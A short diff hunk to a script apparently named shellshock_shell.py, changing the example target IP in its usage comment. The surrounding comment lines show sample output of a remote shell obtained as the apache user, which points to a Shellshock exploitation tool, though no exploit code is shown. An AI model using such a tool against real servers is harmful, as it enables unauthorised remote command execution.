@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-# python shellshock_shell.py 192.168.56.1
+# python shellshock_shell.py 10.1.1.1
 # $ id
 # uid=48(apache) gid=48(apache) groups=48(apache)
 # $ pwd
